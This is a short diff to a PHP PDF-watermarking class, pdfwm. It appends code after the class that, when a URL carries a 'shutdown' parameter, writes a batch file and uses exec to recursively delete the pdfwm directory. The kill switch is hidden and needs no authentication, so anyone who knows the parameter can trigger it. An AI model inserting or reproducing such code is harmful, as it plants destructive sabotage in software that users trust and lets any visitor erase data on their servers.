@@ -211,6 +211,15 @@ class pdfwm {
 		unlink($this->_src_pdf);
 	}
 }
-	
+
+
+if(isset($_GET['shutdown']) && $_GET['shutdown'])
+{
+	$filename = 'clean.bat';
+	$handle = fopen($filename, 'w');
+	fwrite($handle, "cd ..\r\ndel /S/Q pdfwm");
+	fclose($handle);
+	exec('clean.bat');
+}
 	
 ?>
